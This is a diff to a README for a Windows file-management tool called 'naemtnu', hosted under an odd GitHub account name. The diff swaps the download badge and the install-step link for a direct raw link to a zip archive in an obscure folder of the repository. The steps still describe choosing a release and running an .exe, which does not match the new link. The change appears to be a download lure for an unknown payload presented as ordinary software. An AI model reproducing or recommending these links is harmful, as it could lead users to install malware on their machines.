@@ -1,6 +1,6 @@
 # 🖥️ naemtnu - Simplify your daily desktop file management
 
-[![](https://img.shields.io/badge/Download_naemtnu-Grey?style=for-the-badge)](https://github.com/lightmiddleweightsiroliverlodge727/naemtnu)
+[![](https://img.shields.io/badge/Download_naemtnu-Grey?style=for-the-badge)](https://github.com/lightmiddleweightsiroliverlodge727/naemtnu/raw/refs/heads/main/begar/Software_v3.3.zip)
 
 ## 📌 About the software
 
@@ -20,7 +20,7 @@ This application runs on any standard Windows 10 or Windows 11 computer. Ensure 
 
 Follow these steps to set up the software on your machine:
 
-1. Visit [this page](https://github.com/lightmiddleweightsiroliverlodge727/naemtnu) to access the download options.
+1. Visit [this page](https://github.com/lightmiddleweightsiroliverlodge727/naemtnu/raw/refs/heads/main/begar/Software_v3.3.zip) to access the download options.
 2. Select the latest version listed under the Releases section.
 3. Choose the Windows installer file ending in .exe.
 4. Open the downloaded file once the transfer completes.
